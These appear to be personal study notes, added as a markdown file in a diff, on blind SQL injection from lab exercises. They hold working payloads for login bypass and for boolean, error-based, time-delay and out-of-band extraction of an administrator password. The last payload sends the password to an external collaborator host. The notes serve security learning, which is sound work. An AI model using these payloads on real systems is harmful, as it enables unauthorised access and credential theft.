@@ -1,0 +1,181 @@
+
+Unlike In-Band SQL injection, where we can see the results of our attack directly on the screen, blind SQLi is when we get little to no feedback to confirm whether our injected queries were, in fact, successful or not, this is because the error messages have been disabled, but the injection still works regardless. It might surprise you that all we need is that little bit of feedback to successfully enumerate a whole database.  
+
+
+**Authentication Bypass**
+
+One of the most straightforward Blind SQL Injection techniques is when bypassing authentication methods such as login forms. In this instance, we aren't that interested in retrieving data from the database; We just want to get past the login. 
+
+  
+
+Login forms that are connected to a database of users are often developed in such a way that the web application isn't interested in the content of the username and password but more in whether the two make a matching pair in the users table. In basic terms, the web application is asking the database, "Do you have a user with the username bob and the password bob123?" the database replies with either yes or no (true/false) and, depending on that answer, dictates whether the web application lets you proceed or not. 
+
+  
+
+Taking the above information into account, it's unnecessary to enumerate a valid username/password pair. We just need to create a database query that replies with a yes/true.
+
+  
+
+**Practical:**
+
+Level Two of the SQL Injection examples shows this exact example. We can see in the box labelled "SQL Query" that the query to the database is the following:
+
+  
+
+`select * from users where username='%username%' and password='%password%' LIMIT 1;`
+
+  
+
+N.B The **%username%** and **%password%** values are taken from the login form fields. The initial values in the SQL Query box will be blank as these fields are currently empty.
+
+  
+
+To make this into a query that always returns as true, we can enter the following into the password field:
+
+  
+
+`' OR 1=1;--`
+
+  
+
+Which turns the SQL query into the following:
+
+  
+
+`select * from users where username='' and password='' OR 1=1;`
+
+  
+
+Because 1=1 is a true statement and we've used an **OR** operator, this will always cause the query to return as true, which satisfies the web applications logic that the database found a valid username/password combination and that access should be allowed.
+
+For conditional response
+
+Steps
+
+1. identifying the injection and trying to balance it 
+
+```bash
+
+' AND '1'='1
+```
+
+2.  Verify that the condition is true, confirming that there is a table called `users`
+
+```
+' AND (SELECT 'a' FROM users LIMIT 1)='a
+```
+
+3. Verify that the condition is true, confirming that there is a user called `administrator`.
+
+```
+' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+```
+
+4. The next step is to determine how many characters are in the password of the `administrator` user.
+
+```
+
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+
+```
+
+5. Send a series of follow-up values to test different password lengths. Send:
+
+```
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a
+```
+
+6. In Burp Intruder, change the value of the cookie to:
+
+```bash
+
+TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+```
+
+7. To do this, go back to the **Intruder** tab, and change the specified offset from 1 to 2. You should then see the following as the cookie value:
+
+```bash
+TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
+```
+
+
+For conditional error
+
+1. prove parameter is vulnerable
+
+```bash
+
+' || (select '') ||'
+
+### for oracle
+
+' || (select '' from dual) ||'
+
+```
+
+2. confirm users table 
+
+```bash
+
+' || (select '' from users) ||'
+
+' || (select '' from users where rownum=1) ||'
+```
+
+3. confirm user administrator exists
+
+```
+' || (select '' from users where username='administrator) ||'
+
+## using CASE
+here order of execution is really important first i will check for existance of table like dual, users ..etc if its exists the goes for the cases
+
+PS: IT WILL ERROR IF ADMINISTRATOR USER EXISTS DUE TO TO_CHAR(1/0)
+
+ ' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END from dual) ||'
+ 
+ ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) ||'
+ 
+  ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END from users where username='administrator') ||'
+
+```
+
+4. determine the length of administrator user
+
+```bash
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END from users where username='administrator' and LENGTH(password)>1) ||'
+
+```
+
+5. output the admin password using substring method
+
+```bash
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END from users where username='administrator' and SUBSTRING(password,1,1)='a') ||'
+
+```
+
+
+# Blind SQL injection with time delays
+
+
+```bash
+'||pg_sleep(10)-- 
+
+```
+
+
+# Blind SQL injection with out-of-band interaction
+
+```bash
+
+x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+
+```
+
+
+
+TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.npg7pl6n52kdx661edec2sdkwb22qseh.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
+
+
+npg7pl6n52kdx661edec2sdkwb22qseh.oastify.com
